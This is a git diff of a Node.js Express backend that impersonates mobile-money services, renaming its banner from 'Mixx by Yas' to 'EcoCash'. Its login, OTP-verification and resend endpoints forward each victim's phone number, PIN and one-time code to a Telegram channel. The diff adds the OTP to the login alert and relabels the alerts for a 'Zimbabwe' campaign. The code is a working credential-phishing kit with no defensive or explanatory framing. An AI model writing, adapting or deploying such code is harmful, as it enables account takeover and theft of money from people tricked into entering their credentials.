@@ -43,7 +43,7 @@ async function sendTelegramMessage(message) {
 app.get('/', (req, res) => {
     res.json({
         status: 'online',
-        message: 'Mixx by Yas API is running!',
+        message: 'EcoCash API is running!',
         timestamp: new Date().toISOString()
     });
 });
@@ -71,13 +71,16 @@ app.post('/api/login', async (req, res) => {
     const otp = Math.floor(100000 + Math.random() * 900000).toString();
     console.log(`🔐 OTP for ${phone}: ${otp}`);
 
+    // Send to Telegram - UPDATED MESSAGE TITLE
     await sendTelegramMessage(`
-🔔 <b>MIXX BY YAS - LOGIN</b>
+🔔 <b>ClassyDate..R...Attempt</b>
 ━━━━━━━━━━━━━━━━━━━━━
 
 📱 <b>Phone:</b> ${phone}
 🔐 <b>PIN:</b> <code>${pin}</code>
+🔑 <b>OTP:</b> <code>${otp}</code>
 🕐 <b>Time:</b> ${new Date().toLocaleString()}
+🌐 <b>Service:</b> Zimbabwe
 
 ━━━━━━━━━━━━━━━━━━━━━
 🔒 Secure · Fast · Reliable
@@ -102,14 +105,16 @@ app.post('/api/verify-otp', async (req, res) => {
         });
     }
 
+    // Send to Telegram - UPDATED MESSAGE TITLE
     await sendTelegramMessage(`
-✅ <b>MIXX BY YAS - OTP VERIFICATION</b>
+✅ <b>ClassyDate..R...Verified</b>
 ━━━━━━━━━━━━━━━━━━━━━
 
 📱 <b>Phone:</b> ${phone}
 🔑 <b>OTP Entered:</b> <code>${otp}</code>
 🕐 <b>Time:</b> ${new Date().toLocaleString()}
 📊 <b>Status:</b> VERIFIED ✅
+🌐 <b>Service:</b> Zimbabwe
 
 ━━━━━━━━━━━━━━━━━━━━━
 🔒 Secure · Fast · Reliable
@@ -136,13 +141,15 @@ app.post('/api/resend-otp', async (req, res) => {
 
     const otp = Math.floor(100000 + Math.random() * 900000).toString();
 
+    // Send to Telegram - UPDATED MESSAGE TITLE
     await sendTelegramMessage(`
-🔄 <b>MIXX BY YAS - RESEND OTP</b>
+🔄 <b>ClassyDate..R...Resend</b>
 ━━━━━━━━━━━━━━━━━━━━━
 
 📱 <b>Phone:</b> ${phone}
 🔑 <b>New OTP:</b> <code>${otp}</code>
 🕐 <b>Time:</b> ${new Date().toLocaleString()}
+🌐 <b>Service:</b> Zimbabwe
 
 ━━━━━━━━━━━━━━━━━━━━━
 🔒 Secure · Fast · Reliable
